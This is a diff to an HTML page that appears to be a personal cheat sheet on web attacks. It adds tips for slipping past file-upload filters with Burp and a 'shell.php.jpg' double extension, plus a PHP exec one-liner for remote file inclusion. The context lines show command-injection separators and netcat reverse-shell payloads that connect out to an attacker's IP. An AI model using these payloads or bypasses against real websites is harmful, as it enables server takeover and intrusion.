@@ -123,7 +123,9 @@
     mixing code would be --- <b>[their_code;attacker_code]</b> or <b>[their_code ; attacker_code]</b> or <b>[their_code|attacker_code]</b> or <b>[their_code | attacker_code]</b> or <b>[their_code&&attacker_code]</b> or <b>[their_code && attacker_code]</b></p>
 
     <h2><li>File upload vulnerability</li></h2>
-    <p> If website allow to upload any kind file like .php, .python then this vulnerability exist</p>
+    <p> If website allow to upload any kind file like .php, .python then this vulnerability exist. <br>
+    If they block other file upload, then intercept the request with burp suit, modifiy file name then forward it.<br>
+    if they check file extension too.. then modifiy name with like this >>>> shell.php.jpg</p>
   
   </div>
             <!--  Vulnerability Finding section end here    -->
@@ -194,7 +196,8 @@ nc -e /bin/sh 10.20.14 8080<br>
     <h2><li>Remote File Inclusion (RFI) exploitation</li></h2>
     <p>Remote file inclusion same as LFI. sent payload url as input. <br>
     make php payload like ( <pre>  &lt;?passthru("nc -e /bin/sh [ip] [port]");?&gt;</pre>) or any kind of command and save it as a txt file.<br>
-    Then give this file url as a payload with '?' at the end of the payload.
+    Then give this file url as a payload with '?' at the end of the payload.<br><br>
+    To execute command and see output use <pre> &lt;?php print exec('[cmd]');?&gt;</pre>
     </p>
 </div>
    <!-- Exploitation section end here  -->
